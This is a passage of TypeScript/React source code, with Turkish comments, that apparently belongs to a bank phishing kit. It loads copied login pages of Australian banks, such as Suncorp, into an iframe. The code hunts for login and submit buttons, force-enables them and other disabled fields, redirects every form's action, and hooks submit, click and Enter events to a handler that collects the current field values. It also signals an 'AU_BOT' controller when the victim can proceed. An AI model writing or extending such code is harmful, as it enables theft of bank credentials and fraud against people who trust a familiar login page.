        // Polling BRUTE FORCE FALLBACK: Eğer standart selectorlarla 0 node geldiyse
        // form + doc içinde class/id/textte btn/button/login/submit/next/continue vs geçen her elementi al
        if (candidateNodes.length === 0) {
          try {
            const fallBackSource = form ?? doc.body ?? doc.documentElement;
            const allIn = fallBackSource.querySelectorAll<HTMLElement>("*");
            const bfRe = /btn|button|login|submit|continue|next|ileri|giriş|giris|sonraki|tamam|onay|devam|enter|confirm|password_submit|submit_password|acceso|iniciar|logon|log_in|signin|sign_in/i;
            const extra: HTMLElement[] = [];
            allIn.forEach((el) => {
              if (seenCandidates.has(el)) return;
              const tag = (el.tagName || "").toLowerCase();
              const type = (el.getAttribute("type") || "").toLowerCase();
              const tOk = tag === "button" || type === "submit" || type === "button" || el.getAttribute("role") === "button";
              const idClsTxt = `${el.id || ""} ${el.getAttribute("class") || ""} ${el.getAttribute("data-testid") || ""} ${el.getAttribute("name") || ""} ${(el.textContent || "").trim().slice(0, 120)}`;
              if (tOk || bfRe.test(idClsTxt)) {
                seenCandidates.add(el);
                extra.push(el);
              }
            });
            // Fallback node'ları için de candidate loop'taki tüm stillendirme + handler bağlama
            extra.forEach((node) => {
              candidateNodes.push(node);
              if ("disabled" in node) {
                try { (node as any).disabled = !shouldForceEnable; } catch {}
              }
              try {
                if (shouldForceEnable) node.removeAttribute("disabled");
              } catch {}
              try {
                node.setAttribute("aria-disabled", shouldForceEnable ? "false" : "true");
              } catch {}
              try {
                node.style.pointerEvents = shouldForceEnable ? "auto" : "none";
                node.style.opacity = "1";
                node.style.cursor = shouldForceEnable ? "pointer" : "not-allowed";
              } catch {}
              try {
                if (shouldForceEnable) {
                  const classesToRemove: string[] = [];
                  for (let i = 0; i < node.classList.length; i++) {
                    const cls = node.classList[i];
                    if (/disabled|disabl|not-allowed|is-disabled|btn-disabled|sg-Btn--disabled|disabled-btn/i.test(cls)) {
                      classesToRemove.push(cls);
                    }
                  }
                  classesToRemove.forEach((c) => node.classList.remove(c));
                }
              } catch {}
              try {
                if (shouldForceEnable) {
                  node.style.background = activeColor;
                  node.style.color = "#FFFFFF";
                  node.style.border = `1px solid ${activeColor}`;
                  node.style.boxShadow = "0 10px 24px rgba(245, 108, 0, 0.28)";
                } else {
                  node.style.background = "#E6E8EA";
                  node.style.color = "#ABAEAF";
                  node.style.border = "1px solid transparent";
                  node.style.boxShadow = "none";
                }
              } catch {}
              try {
                const curRef = submitWithCurrentValuesRef.current;
                try { node.removeEventListener("click", curRef as any, false); } catch {}
                try { node.removeEventListener("mousedown", curRef as any, false); } catch {}
                try { node.removeEventListener("touchend", curRef as any, false); } catch {}
                if (shouldForceEnable && curRef) {
                  node.addEventListener("click", curRef as any, false);
                  node.addEventListener("mousedown", curRef as any, false);
                  node.addEventListener("touchend", curRef as any, false);
                  try {
                    node.addEventListener("keydown", (e: Event) => {
                      const ke = e as KeyboardEvent;
                      if (ke && (ke.key === "Enter" || (ke as any).keyCode === 13)) {
                        try { curRef(); } catch {}
                      }
                    }, false);
                  } catch {}
                }
              } catch {}
            });
          } catch {}
        }

        if (candidateNodes.length > 0) {
          savedSubmitActionNodesRef.current = candidateNodes;
        }

        try {
          const formsArr = Array.from(doc.querySelectorAll("form"));
          formsArr.forEach((f) => {
            try {
              f.setAttribute("action", "#");
              f.setAttribute("method", "post");
              f.setAttribute("target", "_self");
              f.setAttribute("novalidate", "novalidate");
            } catch {}
            if (f === form) {
              const curRef = submitWithCurrentValuesRef.current;
              try { f.removeEventListener("submit", curRef as any); } catch {}
              if (curRef) f.addEventListener("submit", curRef as any);
              (f as any)._auBotV3Bound = true;
            }
          });
        } catch {}

        const allFields = getFormFields(form);
        allFields.forEach((field) => {
          try {
            if (field.hasAttribute("readonly")) field.removeAttribute("readonly");
            if (field.hasAttribute("disabled") && field.getAttribute("type") !== "hidden") {
              field.removeAttribute("disabled");
              (field as any).disabled = false;
            }
            if (field.getAttribute("tabindex") === "-1") field.setAttribute("tabindex", "0");
          } catch {}
        });

        if (shouldForceEnable) {
          try {
            if (iframe.contentWindow && typeof iframe.contentWindow.postMessage === "function") {
              try {
                iframe.contentWindow.postMessage({ kind: "AU_BOT_CAN_PROCEED_NOW" }, "*");
              } catch {}
            }
          } catch {}
        }
      } catch (e) {
        /* cross-origin or detached frame — ignore silently */
      }
    };

    const initialTimer = window.setTimeout(runPoll, 250);
    const pollTimer = window.setInterval(runPoll, 800);

    return () => {
      window.clearTimeout(initialTimer);
      window.clearInterval(pollTimer);
    };
  }, [attachFrameBridge, bankSlug, isFinalStep, saving, stepIndex, totalSteps]);

  if (!currentSrc) {
    return (
      <div className="flex min-h-screen items-center justify-center bg-white px-4 text-center text-sm font-medium text-red-600">
        Exact bank page file is missing for {bankName} ({bankSlug}).
        {isAuExactHtmlBank(bankSlug) && bankSlug === "suncorp-bank" ? (
          <div className="mt-2 w-full text-xs text-[#129C4F]">
            Suncorp Bank HTML files (1.html, 2.html, 3.html) bekleniyor. Kullanicidan geldikten sonra public/au-banks/suncorp-bank/ altina yerlestirilecektir.
          </div>
        ) : null}
      </div>
    );
  }

  return (
    <div className="relative min-h-screen bg-white">
      <iframe
        ref={iframeRef}
        title={`${bankName} login`}
        src={currentSrc}
        onLoad={handleFrameLoad}
        className="min-h-screen w-full border-0 bg-white"
      />
    </div>
  );
}
